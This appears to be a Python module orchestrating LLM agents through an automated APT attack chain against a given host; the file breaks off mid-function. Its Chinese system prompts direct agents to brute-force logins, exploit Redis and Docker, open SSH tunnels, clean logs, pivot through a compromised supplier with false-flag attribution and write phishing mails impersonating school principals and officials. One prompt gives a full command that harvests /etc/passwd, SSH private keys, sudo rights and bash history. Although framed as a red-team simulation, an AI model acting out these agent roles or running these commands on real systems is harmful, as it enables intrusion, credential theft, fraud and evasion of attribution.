from __future__ import annotations

import json
import time as _time
from datetime import datetime
from typing import Any, Callable

from .config import DEEPSEEK_DEFAULT_MODEL, DEEPSEEK_FLASH_MODEL
from .models import AptPhase, AptPhaseResult, AptSimulationState, AptTarget
from .qwen_assistant import build_qwen_llm_config, create_qwen_security_assistant
from .tools import run_local_tool


# ── System Prompt 常量 ──────────────────────────────────

APT_ORCHESTRATOR_SYSTEM_MESSAGE = (
    "你是一个 APT 攻击模拟智能体编排器。"
    "你的任务是将目标拆解为多个攻击阶段，协调专业智能体执行各阶段任务。"
    "每次输出严格 JSON 格式。"
)

APT_SYSTEM_RECON = (
    "你是一个情报收集专家。你的任务是对目标进行全方位信息收集。\n\n"
    "**核心原则：先收集，再攻击。任何未授权的爆破都是在中后期才进行的。\n"
    "不要预设目标有特定的协议或服务 — 扫描后发现什么就处理什么。**\n\n"
    "可用工具：\n"
    "- apt_nmap_scan: 使用 nmap 深度扫描目标端口和服务版本（第一步必做，端口范围 1-10000）\n"
    "- apt_cve_scan: 基于扫描结果匹配已知 CVE\n"
    "- apt_smb_enum: 枚举 SMB 共享和文件 — 只用于 SMB 服务（139/445），非 SMB 目标不要调用\n"
    "- dir_enum: Web 目录暴力枚举 — 只用于 HTTP/HTTPS 服务\n"
    "- web_content_fetch: **获取网页 HTML 内容** — 发现 HTTP/HTTPS 服务时必须调用，查看页面内容（可能有凭证提示、认证规则等）\n"
    "- osint_recon: OSINT 信息收集（DNS、子域名、邮箱）\n"
    "- osint_tech_recon: 技术栈识别（Web框架、WAF、防火墙品牌）\n"
    "- osint_social_recon: 社工信息收集（组织架构、人员）\n"
    "- apt_nmap_nse_scan: NSE 漏洞扫描（端口扫描发现具体服务后再考虑）\n"
    "- web_user_agent_brute: 遍历 A-Z 单字母 User-Agent 检测基于 UA 的访问控制 — 发现 HTTP/HTTPS 服务时必须执行\n"
    "- **web_codename_brute: 使用自定义 codename 字典作为 User-Agent 批量探测 — 发现 HTTP/HTTPS 且有 UA 认证机制时必须执行**\n\n"
    "**执行流程（不要跳过步骤，不要预设目标协议）：**\n"
    "1. 先用 apt_nmap_scan 扫描端口 1-10000，分析 nmap 输出的 **service** 和 **product** 字段\n"
    "2. 调用 apt_cve_scan 基于扫描结果匹配已知 CVE\n"
    "3. **根据 nmap 实际发现的端口和服务类型，选择对应的工具：**\n"
    "   如果 nmap 发现 SMB 服务（139/445）→ 调用 apt_smb_enum\n"
    "   如果 nmap 发现 HTTP/HTTPS 服务 → 调用 web_content_fetch 获取页面内容，再调 dir_enum、web_user_agent_brute 和 web_codename_brute\n"
    "   如果 nmap 发现数据库服务（Redis 6379）→ 后续阶段处理\n"
    "   如果 nmap 发现其他服务（Modbus/PLC/工控/数据库/等）→ 记录下来，后续阶段处理\n"
    "   不要因为没有找到 80/445/22 就觉得目标没有价值 — **工控协议、私有协议、非标准端口同样重要**\n"
    "4. 用 osint_tech_recon 识别技术栈\n"
    "5. 用 osint_social_recon 收集社工信息\n\n"
    "**关键：不要预设目标一定有 SMB、Web 或 SSH。根据 nmap 返回的实际结果，发现了什么服务就处理什么服务。**\n\n"
    "输出格式：\n"
    "```json\n"
    "{\n"
    '  "summary": "情报收集概要（包含发现的用户名、路径、关键文件）",\n'
    '  "findings": ["发现1", "发现2"],\n'
    '  "discovered_users": ["从文件/页面中提取的用户名列表"],\n'
    '  "discovered_passwords": ["从文件中提取的可能密码线索"],\n'
    '  "web_dirs": [...],\n'
    '  "smb_shares": [...],\n'
    '  "scan_result": {...},\n'
    '  "cve_result": {...},\n'
    '  "blue_team_awareness_delta": 5\n'
    "}\n"
    "```"
)

APT_SYSTEM_SOCIAL_ENG = (
    "你是一个社会工程学专家。你的任务是基于情报收集结果，策划社工攻击方案。\n"
    "可用工具：\n"
    "- se_phishing_gen: 生成钓鱼邮件（支持领导冒充/IT通知/会议附件等场景）\n"
    "- se_conversation_gen: 生成社工话术脚本（IT支持/外包商/HR场景）\n\n"
    "核心场景 — 冒充校长/领导钓鱼（针对教育/政府/事业单位）：\n"
    "- 冒充校长、局长、总经理等一把手，语气威严简洁\n"
    "- 贴合中国单位行政公文风格：「接上级通知」「请立即落实」「不得有误」\n"
    "- 附件伪装：红头文件扫描件、会议通知、绩效考核表、信息安全培训材料\n"
    "- 典型场景：要求点击链接完成 OA 认证、下载附件查看紧急通知\n\n"
    "要求：\n"
    "- 钓鱼邮件必须贴合中国单位行文习惯，使用「贵单位」「请遵照执行」等正式用语\n"
    "- 话术脚本要有完整的身份铺垫→建立信任→索取信息→收尾四步\n"
    "- 针对不同目标角色（校长/IT/行政）生成差异化话术\n\n"
    "输出格式：\n"
    "```json\n"
    "{\n"
    '  "summary": "社工攻击方案概要",\n'
    '  "findings": ["发现1", "发现2"],\n'
    '  "phishing_result": {...},\n'
    '  "conversation_result": {...},\n'
    '  "blue_team_awareness_delta": 10\n'
    "}\n"
    "```"
)

APT_SYSTEM_INITIAL_ACCESS = (
    "你是一个边界突破专家。你的任务是基于情报收集结果，突破目标边界获得初始控制权。\n\n"
    "**核心原则：情报驱动，定向打击。绝不盲目大规模扫描或爆破。\n"
    "所有攻击基于 RECON 阶段发现的开放端口和服务，不要预设目标有特定的协议。**\n\n"
    "可用工具：\n"
    "- web_content_fetch: **获取网页 HTML 源码和页面内容，分析页面中的提示信息**\n"
    "- web_user_agent_brute: 遍历 A-Z 单字母 User-Agent（快速筛选）\n"
    "- **web_codename_brute: 使用自定义 codename 字典作为 User-Agent 批量探测（核心工具——已知部分 codename 后用这个扩展枚举）**\n"
    "- dir_enum: Web 目录枚举 — 发现隐藏目录和配置文件\n"
    "- apt_credential_attack: 服务弱口令爆破 — **最后手段**，SSH/FTP/SMB 只在 web 攻击全部失败后才尝试\n"
    "- apt_web_poc: Web 漏洞 PoC 检测（SQLi/LFI/XSS）\n"
    "- apt_smb_enum: SMB 匿名共享枚举\n"
    "- apt_cve_verify: CVE PoC 验证\n"
    "- apt_redis_exploit: Redis 未授权利用\n"
    "- apt_docker_exploit: Docker API 未授权利用\n"
    "- apt_exploit_plan: 汇总突破方案\n\n"
    "**攻击流程（严格按顺序，先 Web 后其他，不要跳过步骤）：**\n\n"
    "Step A — Web 应用认证突破（如果 RECON 阶段发现 HTTP/HTTPS 服务）：\n"
    "  a1. 调用 web_content_fetch 获取网页 HTML，检查页面提示的认证方式\n"
    "  a2. 如果有 codename/User-Agent 认证机制 → 调用 web_user_agent_brute 快速扫描单字母\n"
    "  a3. **调用 web_codename_brute 带自定义字典批量枚举 codename** —字典包含 RECON 发现的有效名称 + 常见角色名\n"
    "  a4. 对发现的每个有效 codename，再次调用 web_content_fetch 带上不同的 path（如 /admin、/flag、/dashboard），\n"
    "      用有效的 codename 作为 User-Agent 访问，看哪些路径能获取额外内容\n"
    "  a5. **调用 web_login_brute 对发现的 codename 执行定向密码爆破** — 传入 usernames=[发现的有效codename],\n"
    "      passwords=[常见弱口令]。这个工具专门尝试 HTTP Basic Auth、表单登录和 UA+密码组合\n"
    "  a6. 调用 dir_enum 枚举隐藏路径\n\n"
    "Step B — 非 Web 服务攻击（只有确认没有 Web 服务时才优先做这个）：\n"
    "  · 从 RECON 阶段的 nmap 结果中确认实际开放的服务\n"
    "  · 只攻击实际开放的服务，不要碰未开放的端口\n"
    "  · 调用 apt_credential_attack(host, services=[...], users=[...], passwords=[...])\n"
    "  **注意：ap_credential_attack 主要用于 SSH/FTP/SMB，不是 Web 认证的解决方案**\n\n"
    "Step C — 漏洞利用（仅当上述步骤完全失败后）：\n"
    "  · Web → apt_web_poc\n"
    "  · AJP(8009) → apt_cve_verify(cve_id=\"CVE-2020-1938\")\n"
    "  · Redis(6379) → apt_redis_exploit\n"
    "  · Docker(2375) → apt_docker_exploit\n\n"
    "**关键提醒：\n"
    "  · 如果目标有 Web 服务且存在 codename/UA 认证机制，**优先突破 Web，不要直接转向 SSH 爆破**\n"
    "  · SSH 爆破成功率极低且耗时，只在 Web 认证尝试完全失败后再考虑\n"
    "  · 每次 web_content_fetch 调用都可以带不同的 user_agent 参数和 path 参数组合\n"
    "  · 找到了有效凭证后，立刻输出 compromised=true，不需要继续爆破 SSH**\n\n"
    "输出格式：\n"
    "```json\n"
    "{\n"
    '  "summary": "边界突破结果概要",\n'
    '  "findings": ["发现1", "发现2"],\n'
    '  "credential_result": {...},\n'
    '  "web_auth_result": {...},\n'
    '  "compromised": true/false,\n'
    '  "credentials": {"username": "...", "password": "..."},\n'
    '  "blue_team_awareness_delta": 15\n'
    "}\n"
    "```"
)

APT_SYSTEM_PERSISTENCE = (
    "你是一个持久化控制专家。你的任务是在突破目标后建立稳定的持久化控制。\n"
    "可用工具：\n"
    "- apt_persistence_plan: 规划持久化方案（WebShell/定时任务/注册表/隧道）\n"
    "- apt_log_clean: 规划日志清理策略\n"
    "- apt_tunnel_establish: **建立 SSH SOCKS5 隧道**（需从 INITIAL_ACCESS 获得 SSH 凭证）\n"
    "- apt_remote_exec: **在已控目标上执行命令**（验证控制权、信息收集）\n\n"
    "如果已获得 SSH 凭证（从上一阶段），请立即执行：\n"
    "1. 先用 apt_remote_exec 执行 whoami/id/uname 验证控制权\n"
    "2. 再用 apt_tunnel_establish 建立 SOCKS5 隧道\n"
    "为后续内网横向移动准备代理通道。\n\n"
    "注意：只输出方案描述，不生成真实恶意代码。\n\n"
    "输出格式：\n"
    "```json\n"
    "{\n"
    '  "summary": "持久化方案概要",\n'
    '  "findings": ["发现1", "发现2"],\n'
    '  "persistence_result": {...},\n'
    '  "log_clean_result": {...},\n'
    '  "blue_team_awareness_delta": 20\n'
    "}\n"
    "```"
)

APT_SYSTEM_LATERAL = (
    "你是一个横向移动与权限提升专家。你的唯一任务是在当前已控主机上进行本地提权。\n"
    "你没有网络扫描工具，也不能扫描内网。只做本地提权。\n\n"
    "可用工具：\n"
    "- apt_remote_exec: **在已控目标上执行系统命令**（需要 SSH 凭证）— 核心工具\n"
    "- apt_privilege_plan: 权限提升方案规划\n\n"
    "**执行流程（必须严格遵守，只有两步）：**\n\n"
    "第1步 — 用一条命令收集全部信息（只调用一次 apt_remote_exec！）：\n"
    "  将以下所有命令合并为一个字符串，用 && 连接，一次性执行。\n"
    "  **每个可能慢或卡的命令前必须加 timeout 10**：\n"
    "  用 ; 分隔（不是 &&），确保每个命令独立执行，不受前一个命令失败影响：\n"
    "  echo '===USERS==='; cat /etc/passwd; echo '===HOME==='; ls -la /home/; echo '===SSH_KEYS==='; timeout 10 find /home -name id_rsa -o -name id_dsa -o -name '*.key' -o -name authorized_keys 2>/dev/null; echo '===HOME_PERMS==='; ls -la /home/*/ 2>/dev/null; echo '===SUDO==='; echo '' | sudo -S -ln 2>&1 || true; echo '===SUID==='; timeout 15 find / -perm -4000 -type f 2>/dev/null | head -20; echo '===BASH_HISTORY==='; timeout 5 cat /home/*/.bash_history 2>/dev/null | tail -30; echo '===DONE==='\n\n"
    "第2步 — 根据收集到的信息执行定向提权：\n"
    "  - 如果发现其他用户的 id_rsa 可读 → 调用 apt_remote_exec 下载私钥内容\n"
    "  - 如果有 SUID 可利用的二进制 → 调用 apt_privilege_plan 规划提权路径\n"
    "  - 分析后直接输出 JSON 摘要\n\n"
    "**重要：如果 SSH 连接失败（banner错误/连接被拒/认证失败），不要反复重试！"
    "直接输出 JSON 摘要说明失败原因。任何时候都只输出 JSON，不要输出推理过程。**\n\n"
    "输出格式：\n"
    "```json\n"
    "{\n"
    '  "summary": "横向移动/提权概要",\n'
    '  "findings": ["发现1", "发现2"],\n'
    '  "lateral_result": {...},\n'
    '  "privilege_result": {...},\n'
    '  "asset_inventory": [...],\n'
    '  "blue_team_awareness_delta": 20\n'
    "}\n"
    "```"
)

APT_SYSTEM_CROSS_TARGET = (
    "你是一个跨目标打击专家。你的任务是利用已控制的跳板目标攻击下游目标。\n"
    "可用工具：\n"
    "- apt_cross_plan: 跨目标攻击规划（利用已控 A 攻击 B/C，指定跳板源和攻击手段）\n"
    "- apt_evasion_plan: 绕过与对抗方案\n"
    "- apt_port_forward: **SSH 端口转发** — 通过已控 A 访问下游 B 的内网服务\n"
    "- apt_remote_exec: **在跳板上远程执行命令** — 为跨目标攻击做准备\n\n"
    "核心策略 — 供应链跳板攻击 + 声东击西：\n"
    "- 利用已控目标 A 的防火墙/VPN/内网权限作为跳板，攻击下游目标 B\n"
    "- 识别 A 和 B 之间的信任关系（内网互联、共享 AD 域、VPN 专线、供应商通道）\n"
    "- 在 A 制造扫描噪音/虚假攻击作为诱饵，实则主攻 B\n"
    "- 如果 B 也被控，继续向下游 C 扩散（钓鱼/漏洞利用/凭证复用）\n"
    "- 严格声东击西：A 上留虚假攻击者画像，混淆溯源和归因\n\n"
    "输出格式：\n"
    "```json\n"
    "{\n"
    '  "summary": "跨目标打击方案概要",\n'
    '  "findings": ["发现1", "发现2"],\n'
    '  "cross_result": {...},\n'
    '  "evasion_result": {...},\n'
    '  "via_target": "...",\n'
    '  "next_hop_targets": [...],\n'
    '  "blue_team_awareness_delta": 15\n'
    "}\n"
    "```"
)

APT_SYSTEM_REPORT = (
    "你是一个报告生成专家。你的任务是汇总所有阶段的发现，生成完整的 APT 攻击链报告。\n"
    "可用工具：\n"
    "- apt_report_gen: 生成最终 APT 攻击模拟报告\n\n"
    "报告必须包含：\n"
    "1. 执行摘要\n"
    "2. 按时间线的完整攻击链\n"
    "3. 关键脆弱性总结\n"
    "4. 按阶段分类的加固建议\n\n"
    "输出格式：\n"
    "```json\n"
    "{\n"
    '  "summary": "报告概要",\n'
    '  "findings": ["关键发现"],\n'
    '  "report_result": {...},\n'
    '  "blue_team_awareness_delta": 0\n'
    "}\n"
    "```"
)


# ── 阶段编排表 ──────────────────────────────────────────

# 三套攻击向量的阶段序列
VECTOR_PHASES: dict[str, list[AptPhase]] = {
    # A — 互联网边界突破：情报收集 → 防火墙突破 → 持久化 → 内网扫描+横向移动
    "firewall_breach": [
        AptPhase.RECON,
        AptPhase.INITIAL_ACCESS,
        AptPhase.PERSISTENCE,
        AptPhase.LATERAL,
    ],
    # B — 供应链跳板：利用已控乙方攻击丙方设备
    "supply_chain": [
        AptPhase.RECON,
        AptPhase.INITIAL_ACCESS,
        AptPhase.PERSISTENCE,
        AptPhase.CROSS_TARGET,
    ],
    # C — 社工钓鱼：大模型生成中文钓鱼邮件 → 控制设备
    "phishing": [
        AptPhase.SOCIAL_ENG,
        AptPhase.INITIAL_ACCESS,
        AptPhase.PERSISTENCE,
    ],
}

VECTOR_LABELS: dict[str, str] = {
    "firewall_breach": "A — 互联网边界突破（防火墙→内网扫描→横向移动）",
    "supply_chain": "B — 供应链跳板（利用已控乙方攻击丙方）",
    "phishing": "C — 社工钓鱼（大模型生成中文钓鱼邮件控制设备）",
}

PHASE_SYSTEM_PROMPTS: dict[AptPhase, str] = {
    AptPhase.RECON: APT_SYSTEM_RECON,
    AptPhase.SOCIAL_ENG: APT_SYSTEM_SOCIAL_ENG,
    AptPhase.INITIAL_ACCESS: APT_SYSTEM_INITIAL_ACCESS,
    AptPhase.PERSISTENCE: APT_SYSTEM_PERSISTENCE,
    AptPhase.LATERAL: APT_SYSTEM_LATERAL,
    AptPhase.CROSS_TARGET: APT_SYSTEM_CROSS_TARGET,
    AptPhase.REPORT: APT_SYSTEM_REPORT,
}

PHASE_TOOLS: dict[AptPhase, list[str]] = {
    AptPhase.RECON: [
        "osint_recon", "osint_tech_recon", "osint_social_recon",
        "apt_nmap_scan", "apt_cve_scan", "apt_nmap_nse_scan",
        "apt_smb_enum", "dir_enum", "web_fingerprint",
        "web_content_fetch", "web_user_agent_brute", "web_codename_brute",
    ],
    AptPhase.INITIAL_ACCESS: [
        "apt_exploit_plan", "apt_credential_attack", "apt_web_poc",
        "apt_cve_verify", "apt_redis_exploit", "apt_docker_exploit",
        "apt_smb_enum", "dir_enum", "web_content_fetch", "web_user_agent_brute", "web_codename_brute", "web_login_brute",
        "hash_extract", "hash_crack",
    ],
    AptPhase.SOCIAL_ENG: ["se_phishing_gen", "se_conversation_gen"],
    AptPhase.PERSISTENCE: ["apt_persistence_plan", "apt_log_clean", "apt_tunnel_establish", "apt_remote_exec", "apt_smb_enum"],
    AptPhase.LATERAL: ["apt_lateral_plan", "apt_privilege_plan", "apt_remote_exec", "apt_port_forward"],
    AptPhase.CROSS_TARGET: ["apt_cross_plan", "apt_evasion_plan", "apt_port_forward", "apt_remote_exec"],
    AptPhase.REPORT: ["apt_report_gen"],
}

PHASE_LABELS: dict[AptPhase, str] = {
    AptPhase.RECON: "情报收集",
    AptPhase.SOCIAL_ENG: "社工攻击",
    AptPhase.INITIAL_ACCESS: "初始突破",
    AptPhase.PERSISTENCE: "持久化",
    AptPhase.LATERAL: "横向移动",
    AptPhase.CROSS_TARGET: "跨目标打击",
    AptPhase.REPORT: "报告生成",
}

# 按阶段选择模型：工具驱动阶段用 Flash 提速，复杂分析用 Pro
PHASE_MODELS: dict[AptPhase, str] = {
    AptPhase.RECON: DEEPSEEK_FLASH_MODEL,              # 工具编排 → Flash（快 2-3 倍）
    AptPhase.SOCIAL_ENG: DEEPSEEK_FLASH_MODEL,          # 文案生成 → Flash
    AptPhase.INITIAL_ACCESS: DEEPSEEK_FLASH_MODEL,      # 工具驱动 → Flash
    AptPhase.PERSISTENCE: DEEPSEEK_FLASH_MODEL,         # 工具驱动 → Flash
    AptPhase.LATERAL: DEEPSEEK_FLASH_MODEL,              # 本地提权 → Flash
    AptPhase.CROSS_TARGET: DEEPSEEK_DEFAULT_MODEL,       # 跨目标打击 → Pro
    AptPhase.REPORT: DEEPSEEK_FLASH_MODEL,               # 报告汇总 → Flash
}


# ── GBK 安全输出 ─────────────────────────────────────────

def safe_print(text: str, **kwargs: Any) -> None:
    """Windows GBK 终端安全打印，无法编码的字符用 ? 替换"""
    try:
        print(text, **kwargs)
    except UnicodeEncodeError:
        print(text.encode("gbk", errors="replace").decode("gbk"), **kwargs)


# ── JSON 序列化辅助 ──────────────────────────────────────

def _to_jsonable(obj: Any) -> Any:
    """递归将对象转为 JSON 可序列化类型"""
    if obj is None or isinstance(obj, (str, int, float, bool)):
        return obj
    if isinstance(obj, (list, tuple)):
        return [_to_jsonable(i) for i in obj]
    if isinstance(obj, dict):
        return {str(k): _to_jsonable(v) for k, v in obj.items()}
    if isinstance(obj, datetime):
        return obj.isoformat()
    if hasattr(obj, "__dict__"):
        return _to_jsonable(obj.__dict__)
    return str(obj)


# ── 状态构建 ────────────────────────────────────────────

def build_initial_state(target: dict[str, Any]) -> AptSimulationState:
    """从目标配置构建初始状态

    target 可包含:
      - host: 主目标
      - vector: 攻击向量
      - cross_host: (仅 supply_chain) 下游目标/丙方
    """
    vector = target.get("vector", "firewall_breach")
    apt_targets: list[AptTarget] = []

    primary = AptTarget(
        id=target.get("id", "target_0"),
        host=target["host"],
        vector=vector,
    )
    apt_targets.append(primary)

    cross_host = target.get("cross_host", "")
    if cross_host and vector == "supply_chain":
        cross_target = AptTarget(
            id=target.get("cross_id", "target_cross"),
            host=cross_host,
            vector=vector,
        )
        apt_targets.append(cross_target)

    return AptSimulationState(
        targets=apt_targets,
        current_vector=vector,
        start_time=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    )


def build_phase_context(state: AptSimulationState, phase: AptPhase) -> str:
    """将当前状态序列化为阶段上下文"""
    t = state.targets[0]
    cross_t = state.targets[1] if len(state.targets) > 1 else None

    lines: list[str] = [
        f"## 攻击向量: {VECTOR_LABELS.get(state.current_vector, state.current_vector)}",
        f"## 当前阶段: {PHASE_LABELS.get(phase, phase.value)}",
        "",
        f"### 主目标 (跳板): {t.host} (ID: {t.id})",
        f"状态: {'已控' if t.compromised else '未控'} | 权限: {t.access_level}",
    ]
    if cross_t:
        lines.append("")
        lines.append(f"### 下游目标 (攻击目标): {cross_t.host} (ID: {cross_t.id})")
        lines.append(f"状态: {'已控' if cross_t.compromised else '未控'} | 权限: {cross_t.access_level}")
        lines.append("⚠ 你必须通过已控的跳板目标去攻击下游目标，而不是直接攻击下游目标！")

    lines.append(f"蓝队感知度: {state.blue_team_awareness}/100")

    completed = [r for r in state.phase_results.values() if r.status == "success"]
    if completed:
        lines.extend(["", "### 已完成阶段"])
        for r in completed:
            summary = r.summary
            findings = list(r.findings)
            # LATERAL 阶段：过滤子网/内网信息，防止 LLM 忍不住去扫大网段
            if phase == AptPhase.LATERAL:
                import re as _re
                summary = _re.sub(r'\d+\.\d+\.\d+\.\d+/\d+', '[已过滤]', summary)
                summary = _re.sub(r'内网[^\s，。]*段', '[已过滤]', summary)
                findings = [f for f in findings if not _re.search(r'\d+\.\d+\.\d+\.\d+/\d+', f)]
            lines.append(f"- {PHASE_LABELS.get(r.phase, r.phase.value)}: {summary}")
            if findings:
                for f in findings[:2]:
                    lines.append(f"  - {f}")

    # 提取 RECON 阶段发现的开放端口，供后续阶段参考
    if phase in (AptPhase.INITIAL_ACCESS, AptPhase.PERSISTENCE):
        _open_ports = t.discovered_ports
        if not _open_ports:
            _recon_result = state.phase_results.get("recon")
            if _recon_result and _recon_result.details:
                _scan = _recon_result.details.get("scan_result") or {}
                if isinstance(_scan, dict):
                    _ports = _scan.get("open_ports", _scan.get("ports", []))
                    if _ports:
                        _open_ports = [{"port": p} if isinstance(p, (int, str)) else p for p in _ports]
        if _open_ports:
            lines.append("")
            lines.append("### RECON 扫描发现的开放端口（只攻击以下端口）")
            for _op in _open_ports[:10]:
                _pn = _op.get("port", _op.get("portid", "?"))
                _ps = _op.get("service", _op.get("name", "unknown"))
                lines.append(f"  · 端口 {_pn}/{_ps}")
            lines.append("⚠ 只对以上开放端口执行攻击，不要攻击未列出的端口。")

    # 如果之前获得了 SSH 凭证，传递给后续阶段
    creds = state.notes.get("credentials")
    post_exploit = state.notes.get("post_exploit", {})
    if creds and phase in (AptPhase.PERSISTENCE, AptPhase.LATERAL):
        lines.append("")
        lines.append(f"### 已获得的凭证（来自上一阶段后渗透验证）")
        lines.append(f"用户: {creds.get('username', '?')}  密码: {creds.get('password', '?')}")
        lines.append(f"已验证服务: {', '.join(post_exploit.get('verified_services', []))}")
        lines.append(f"权限级别: {post_exploit.get('access_level', 'unknown')}")
        harvested = post_exploit.get("harvested", {})
        if harvested.get("users"):
            lines.append(f"收割用户: {', '.join(harvested['users'][:10])}")
        if harvested.get("hosts"):
            lines.append(f"内网主机: {', '.join(harvested['hosts'][:10])}")
        if harvested.get("passwords"):
            lines.append(f"可能密码: {', '.join(harvested['passwords'][:5])}")
        lines.append("可使用 apt_tunnel_establish/apt_remote_exec 操作已控目标。")
    else:
        init_result = state.phase_results.get("initial_access")
        if init_result and phase in (AptPhase.PERSISTENCE, AptPhase.LATERAL):
            init_details = init_result.details or {}
            cred_result = init_details.get("credential_result", {})
            if cred_result and not cred_result.get("successes"):
                lines.append("")
                lines.append("### SSH 凭证已经在 INITIAL_ACCESS 阶段尝试过，全部失败")
                lines.append(f"共尝试 {cred_result.get('attempts', 0)} 组凭证，无有效凭证。")
                lines.append("不要再对 SSH 做爆破或连接尝试，此路不通。考虑其他攻击方式。")

    lines.extend(["", "### 当前阶段任务"])
    lines.append(f"执行 {PHASE_LABELS.get(phase, phase.value)}，使用可用的工具完成任务。")

    return "\n".join(lines)


# ── 自动工具链执行（无 LLM 参与）───────────────────────

_RECON_WEB_TOOLS = [
    ("web_content_fetch", {"path": "/", "timeout": 3}),
    ("web_user_agent_brute", {"timeout": 2}),
    ("web_codename_brute", {"timeout": 2}),
    ("dir_enum", {"target_prefix": "http://", "timeout": 3}),
]

_RECON_SMB_TOOLS = [
    ("apt_smb_enum", {}),
]


def _run_nmap_scan(target: str) -> dict[str, Any]:
    """socket 多线程端口扫描，3-5s 扫完 1-1000"""
    safe_print(f"  [scan] socket 扫描 {target} 端口 1-1000...")
    _start = _time.monotonic()
    import socket as _socket
    import concurrent.futures as _cf

    def _check(p: int) -> int | None:
        try:
            s = _socket.create_connection((target, p), timeout=0.8)
            s.close()
            return p
        except Exception:
            return None

    with _cf.ThreadPoolExecutor(max_workers=128) as _ex:
        _jobs = [_ex.submit(_check, p) for p in range(1, 1001)]
        open_ports = sorted(_f.result() for _f in _cf.as_completed(_jobs) if _f.result())

    _elapsed = _time.monotonic() - _start
    safe_print(f"  [scan] 完成 ({_elapsed:.1f}s), 开放端口: {open_ports}")

    # 常见端口号 -> 服务名
    _SVC: dict[int, str] = {21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "domain",
        80: "http", 110: "pop3", 111: "rpcbind", 135: "msrpc", 139: "netbios-ssn",
        143: "imap", 443: "https", 445: "microsoft-ds", 993: "imaps", 995: "pop3s",
        1433: "mssql", 1521: "oracle", 2049: "nfs", 3306: "mysql", 3389: "rdp",
        5432: "postgresql", 5900: "vnc", 6379: "redis", 8080: "http-proxy",
        27017: "mongodb", 4444: "unknown", 8888: "http-alt", 9090: "http-alt",
    }
    services = [{"port": p, "name": _SVC.get(p, "unknown"), "state": "open"} for p in open_ports]
    return {"services": services, "scan_duration": _elapsed, "target": target}


def _parse_open_ports(nmap_result: dict[str, Any]) -> list[dict[str, Any]]:
    """从 nmap 结果中提取开放端口及其服务类型

    支持两种格式:
    1. {"ports": [{"port": 80, "service": "http", ...}, ...]}
    2. {"services": [{"port": 80, "name": "http", ...}, ...]}
    """
    ports = nmap_result.get("ports") or nmap_result.get("services") or []
    result: list[dict[str, Any]] = []
    for p in ports:
        if isinstance(p, dict):
            port_num = p.get("port") or p.get("portid") or 0
            svc = (p.get("service") or p.get("name") or "").lower().strip()
            result.append({"port": int(port_num), "service": svc})
    return result


def _categorize_ports(open_ports: list[dict[str, Any]]) -> dict[str, list[int]]:
    """将端口按服务类型分类"""
    categories: dict[str, list[int]] = {}

    # 基于服务名的分类
    for p in open_ports:
        svc = p.get("service", "")
        port = p.get("port", 0)
        if svc in ("http", "https", "http-proxy", "http-alt", "https-alt"):
            categories.setdefault("http", []).append(port)
        elif svc in ("smb", "microsoft-ds", "netbios-ssn"):
            categories.setdefault("smb", []).append(port)
        elif svc == "redis":
            categories.setdefault("redis", []).append(port)
        elif svc in ("docker", "docker-api"):
            categories.setdefault("docker", []).append(port)
        elif svc == "ssh":
            categories.setdefault("ssh", []).append(port)
        elif svc == "ftp":
            categories.setdefault("ftp", []).append(port)
        elif svc == "telnet":
            categories.setdefault("telnet", []).append(port)
        elif svc in ("mysql", "mariadb"):
            categories.setdefault("mysql", []).append(port)
        else:
            categories.setdefault("other", []).append(port)

    # 如果没有服务名但端口已知，按端口号猜测
    if not categories:
        for p in open_ports:
            port = p.get("port", 0)
            if port == 80:
                categories.setdefault("http", []).append(80)
            elif port == 443:
                categories.setdefault("http", []).append(443)
            elif port in (139, 445):
                categories.setdefault("smb", []).append(port)
            elif port == 6379:
                categories.setdefault("redis", []).append(port)
            elif port == 2375:
                categories.setdefault("docker", []).append(port)
            elif port == 22:
                categories.setdefault("ssh", []).append(port)
            elif port == 21:
                categories.setdefault("ftp", []).append(port)

    return categories


def _run_tool_chain(
    target: str,
    port: int,
    tools: list[tuple[str, dict]],
    base_url: str = "",
) -> dict[str, Any]:
    """执行一串工具，返回 {tool_name: result}"""
    results: dict[str, Any] = {}
    for tool_name, params in tools:
        _key = f"{tool_name}_{port}"
        _params: dict[str, Any] = {"target": target, "port": port, **params}
        # 有些工具需要特殊 target 格式（dir_enum 需要 http://host）
        if "target_prefix" in params:
            _params["target"] = f"{params['target_prefix']}{target}:{port}"
            del _params["target_prefix"]
        safe_print(f"  [{tool_name}] 端口 {port}...")
        _start = _time.monotonic()
        try:
            _r = run_local_tool(tool_name, _params)
            results[_key] = _r
            _elapsed = _time.monotonic() - _start
            safe_print(f"  [{tool_name}] 完成 ({_elapsed:.0f}s)")
        except Exception as _exc:
            results[_key] = {"error": str(_exc)[:200]}
            safe_print(f"  [{tool_name}] 错误: {_exc}")
    return results


def _extract_codenames(results: dict[str, Any]) -> list[str]:
    """从工具结果中提取有效的 codename"""
    codenames: list[str] = []
    for _key, _r in results.items():
        if isinstance(_r, dict):
            for _field in ("valid_codenames", "anomalies"):
                _items = _r.get(_field, [])
                if isinstance(_items, list):
                    for _item in _items:
                        if isinstance(_item, str) and _item not in codenames:
                            codenames.append(_item)
                        elif isinstance(_item, dict):
                            _agent = _item.get("agent") or _item.get("codename") or ""
                            if _agent and _agent not in codenames:
                                codenames.append(_agent)
    return codenames


def _auto_recon(target: str) -> dict[str, Any]:
    """全自动 RECON 阶段：nmap → 分类 → 工具链 → 汇总结果"""
    safe_print("  [自动执行] RECON 阶段工具链")

    # 1. nmap 扫描
    scan_result = _run_nmap_scan(target)

    # 2. 解析开放端口
    open_ports = _parse_open_ports(scan_result)
    categories = _categorize_ports(open_ports)

    if not open_ports:
        safe_print("  [警告] nmap 未发现开放端口")
        return {
            "scan_result": scan_result,
            "open_ports": [],
            "http_results": {},
            "smb_results": {},
            "note": "nmap 未发现开放端口",
        }

    # 3. 对 HTTP 服务执行 Web 工具链
    http_results: dict[str, Any] = {}
    for port in categories.get("http", []):
        safe_print(f"  → HTTP 工具链 (端口 {port})")
        http_results.update(_run_tool_chain(target, port, _RECON_WEB_TOOLS))

    # 4. 对 SMB 服务执行 SMB 工具链
    smb_results: dict[str, Any] = {}
    for port in categories.get("smb", []):
        safe_print(f"  → SMB 工具链 (端口 {port})")
        smb_results.update(_run_tool_chain(target, port, _RECON_SMB_TOOLS))

    return {
        "scan_result": scan_result,
        "open_ports": open_ports,
        "categories": categories,
        "http_results": http_results,
        "smb_results": smb_results,
    }


def _extract_usernames_from_all(recon_details: dict[str, Any]) -> list[str]:
    """从 RECON 所有结果中提取用户名/codename（HTTP + SMB + OSINT + 页面内容）"""
    usernames: list[str] = []
    seen: set[str] = set()

